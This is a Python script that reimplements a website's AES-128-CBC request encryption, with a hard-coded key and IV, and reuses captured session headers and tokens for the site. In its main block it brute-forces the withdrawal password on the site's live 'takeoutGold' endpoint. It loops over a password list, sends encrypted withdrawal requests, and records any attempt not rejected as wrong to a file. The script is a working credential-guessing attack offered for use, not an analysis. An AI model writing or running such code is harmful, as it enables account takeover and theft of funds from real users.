import json

import requests
import base64
import hashlib
import time
from Crypto.Cipher import AES


class DeAesCrypt:
    """
    AES-128-CBC解密
    """

    def __init__(self, key=None, iv=None, pad="zero"):
        """
        :param data: 加密后的字符串
        :param key: 随机的16位字符
        :param pad: 填充方式
        """
        self.key = key.encode("utf-8")
        # self.data = data
        self.pad = pad.lower()

        hash_obj = hashlib.md5()  # 构造md5对象
        hash_obj.update(key.encode())  # 进行md5加密,md5只能对byte类型进行加密
        res_md5 = hash_obj.hexdigest()  # 获取加密后的字符串数据
        self.iv = iv.encode("utf-8")

    def zeropadding(self, text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def decrypt_aes(self, data):
        """AES-128-CBC解密"""
        # real_data = base64.b64decode(self.data)
        real_data = base64.b64decode(data)
        my_aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypt_data = my_aes.decrypt(real_data)
        print(decrypt_data)
        return self.get_str(decrypt_data)

    def encyrpt_aes(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.zeropadding(data)
        # 加密
        encrypt_bytes = cipher.encrypt(content_padding)
        # 重新编码
        result = str(base64.b64encode(encrypt_bytes), encoding='utf-8')
        return result

    def get_str(self, bd):
        """解密后的数据去除加密前添加的数据"""
        if self.pad == "zero":  # 去掉数据在转化前不足16位长度时添加的ASCII码为0编号的二进制字符
            return ''.join([chr(i) for i in bd if i != 0])

        # elif self.pad == "pkcs7":  # 去掉pkcs7模式中添加后面的字符
        #     return ''.join([chr(i) for i in i > 32])  # 此处报错，在我环境

        else:
            return "不存在此种数据填充方式"


headers = {
    'authority': 'web.1544242.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'zh',
    'auth': 'TEjKL99Cz3i8Uj6vWovgWGC2ytYtIYsEMQT-d2n0MuhYpr7SQ_kr12th2KM7WrCaTSotHw1RGOc97Y9bZcvm5HR9ac7cOBC7xhz4Om0Oh5PAXrkjVL5qReJRmZ4OPs3tmC2c-gsGgtrRfnz0FuqJGQmLoKeYnNaXVgCu-ZlbHG-w9Z4dGlm2Z83Pwqyb3VYoqkmpx-iaVL7zuoilNDMD032ivhmNm33UGmvMBcbhWez3d0xZQMtiJSHIML1weTWWnzAXYzzu6BItPZa1ZUAEXYc5gWUykD_IiqsHcY_93hhhEDn_Daq2vsvZ6EujeghTZB5FWhwJBIFpE2Ws0pwYMQ',
    'browserfingerid': 'SWZS2wpfkd0K8ySSUbaa',
    'clienttimezone': 'UTC+8',
    'content-type': 'text/plain',
    'currency': 'CNY',
    'data-uuid': 'data-uuid-156',
    'device': '657c402a-39cf-47ad-bc30-eb96fbcae2b6',
    'devicemodel': 'windows',
    'domain': 'www.4424477.com',
    'language': 'zh',
    'nonce': '51aba8eb-555d-48ee-8a98-8ac33590f421',
    'origin': 'https://www.4424477.com',
    'platformtype': '5',
    'referer': 'https://www.4424477.com/',
    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sign': 'TPlPC3dhTCFA3Rt7CwV0X08frAHu6VPlP3bLtP38SJvXXe2KV0gZJgf5CmtT4nEd',
    'sitecode': '128',
    'timestamp': '1679273661',
    'token': '79d832b35ed9919987bc1679273245770429436',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'x-request-id': '51aba8eb-555d-48ee-8a98-8ac33590f421',
}
# data = 'EnySdAsslemHSkmy5lP5GXc3eR8xDjGE9sGijAjnG1jaIMmZK71OoqeOrrN3exwhXIL1YkAZF1iJ0GXlRufwSg=='

# response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies, headers=headers, data=data)
# print(response.json())
if __name__ == '__main__':
    data = 'EnySdAsslemHSkmy5lP5GXc3eR8xDjGE9sGijAjnG1jaIMmZK71OoqeOrrN3exwhXIL1YkAZF1iJ0GXlRufwSg=='
    # key = "8325b1d23ff2eeb4"
    # key = "1f0d57575449c824"
    key = "6ec1c1c9cf8e9ef0"
    iv = "5421698523412578"
    aes_obj = DeAesCrypt(key, iv)
    # ddd = aes_obj.decrypt_aes(data)
    with open("pass.txt", "r") as f:
        i = 0
        for content in f.readlines():
            # print(content)
            try:
                # i += 1
                origin_data = json.dumps({"accessGold": 100, "passwd": content, "time": int(time.time())})
                data = aes_obj.encyrpt_aes(origin_data)
                # response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)
                response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold',headers=headers, data=data)
                res = response.json()
                # if i == 10000:
                #     print("到哪了:", i, data, origin_data)
                if "密码不正确" == res.get("msg"):
                    # print(res)
                    pass
                else:
                    print(res, origin_data, data)
                    with open("corr.txt","a",encoding="utf-8") as f:
                       f.write(str(res)+origin_data+"\r")

            except Exception as e:
                print(str(e), "到那了:", res, origin_data, data)
                time.sleep(10)
                # 报错继续继续本次循环
                continue
